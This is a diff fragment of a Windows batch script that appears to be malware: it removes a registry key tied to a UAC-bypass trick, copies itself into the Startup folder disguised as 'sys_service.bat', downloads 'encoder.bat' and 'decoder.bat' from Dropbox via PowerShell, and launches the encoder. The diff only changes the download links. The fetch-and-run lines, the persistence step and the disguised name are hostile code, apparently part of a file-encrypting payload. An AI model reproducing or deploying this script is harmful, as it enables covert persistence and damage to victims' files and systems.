@@ -31,8 +31,8 @@ reg delete "HKCU\Software\Classes\ms-settings" /f >nul
 copy /y "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\sys_service.bat" >nul
 
 :: Download (Ensure these links are direct download links)
-powershell -Command "Invoke-WebRequest 'https://www.dropbox.com/scl/fi/dpa4aigfcawkzqcic8lu7/encoder.bat?rlkey=s53xc80yzg5swm2nkd1dehewv&st=xa17nacn&dl=1' -OutFile '%USERPROFILE%\Downloads\encoder.bat'"
-powershell -Command "Invoke-WebRequest 'https://www.dropbox.com/scl/fi/6c53lr5id6kofx6ymqyz5/decoder.bat?rlkey=yfxbkwudupu7midoh15l83qzi&st=f7yq4pun&dl=1' -OutFile '%USERPROFILE%\Desktop\decoder.bat'"
+powershell -Command "Invoke-WebRequest 'https://www.dropbox.com/scl/fi/o2kp3013bm6jbeomi4rk6/encoder.bat?rlkey=xjv2zm6vw02l4fwyv4jfmdtco&st=dyl8pw2y&dl=1' -OutFile '%USERPROFILE%\Downloads\encoder.bat'"
+powershell -Command "Invoke-WebRequest 'https://www.dropbox.com/scl/fi/sb07n1jlv1b6o6mtnvvci/decoder.bat?rlkey=k63knpiv08b8cqbg87ipa1oc6&st=39zpleo4&dl=1' -OutFile '%USERPROFILE%\Desktop\decoder.bat'"
 
 echo [+] Executing Encoder...
 start "" "%USERPROFILE%\Downloads\encoder.bat"
